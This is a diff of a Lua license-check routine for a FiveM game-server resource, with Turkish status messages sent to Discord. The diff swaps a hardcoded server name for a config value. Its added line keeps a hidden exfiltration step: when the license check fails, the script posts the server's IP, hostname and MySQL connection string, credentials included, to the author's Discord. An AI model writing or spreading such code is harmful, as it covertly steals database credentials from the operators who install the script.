@@ -1,6 +1,5 @@
 local ip = nil
 local canWork = false
-local oServer = 'anka'
 
 AddEventHandler('onResourceStart', function(resourceName)
   if (GetCurrentResourceName() == resourceName) then
@@ -15,11 +14,11 @@ AddEventHandler('onResourceStart', function(resourceName)
           print('If you have any problems about the ^3script^7 you can contact me ^5via DM - deira#0010^7')
           print('^1github.com/unknowndeira^7')
           print('Thank you for registering the script.^7')
-          sendToDiscord("**||"..ip.."||**'den ***"..oServer.."*** kullanıcı adı ile başarılı bir şekilde scriptlere bağlanıldı! \nServer: **"..GetConvar("sv_hostname")..'**','success')
+          sendToDiscord("**||"..ip.."||**'den ***"..Config.Servername.."*** kullanıcı adı ile başarılı bir şekilde scriptlere bağlanıldı! \nServer: **"..GetConvar("sv_hostname")..'**','success')
         else 
           canWork = false
           Citizen.Wait(1000)
-          sendToDiscord("**||"..ip.."||**'den ***"..oServer.."*** kullanıcı adı ile scriptlere erişilmeye çalışıldı! \nServer: **"..GetConvar("sv_hostname").."** \nMySQL: **"..GetConvar("mysql_connection_string").."** <@319759689900359683>")
+          sendToDiscord("**||"..ip.."||**'den ***"..Config.Servername.."*** kullanıcı adı ile scriptlere erişilmeye çalışıldı! \nServer: **"..GetConvar("sv_hostname").."** \nMySQL: **"..GetConvar("mysql_connection_string").."** <@319759689900359683>")
           CancelEvent()
         end
       end)
